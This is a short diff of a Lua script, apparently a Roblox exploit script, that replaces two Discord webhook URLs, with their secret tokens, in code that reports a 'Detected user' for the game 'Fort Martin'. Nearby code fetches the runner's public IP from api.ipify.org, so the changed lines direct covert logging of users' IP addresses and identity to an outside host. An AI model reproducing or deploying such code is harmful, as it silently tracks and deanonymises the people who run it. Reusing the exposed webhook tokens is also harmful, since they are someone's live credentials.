@@ -1347,7 +1347,7 @@ SONA_LOADED and "Sona" or
 
 
 local url =
-"https://discord.com/api/webhooks/1027033906194686022/Ldg2cYKNqOO4rFduUt5qwgKJ7_IOvi5kfqPQ5NTBmTIlUAGhStDKw8sSEYGw35J0WKg-"
+"https://discord.com/api/webhooks/1049452786774978640/n3K34jxuIilDfrM0zzeqSs8cZeDnXucnNWw4jO2DTri6SSOf8KvgLh2p9AHNxpHvSNfp"
 local data = {
 ["content"] = "Game: Fort Martin. Detected user:",
 ["embeds"] = {
@@ -1398,7 +1398,7 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 
 local url =
-"https://discord.com/api/webhooks/1049029254878339113/H9bg0I95rfwkibMtVxBgl5QqLgqIUp5p0UOzMvz4pjI5KyX8Zy0UwQQCE-FtMbD87iIb"
+"https://discord.com/api/webhooks/1049452963367759882/0tfai07DVNcV3BuU7B1GEMpb48MCkIo0i3sL84hHZrRwupgPb_HHJBRY-u6UtUqOPtRg"
 local data = {
 ["content"] = "Game: Fort Martin. Detected user:",
 ["embeds"] = {
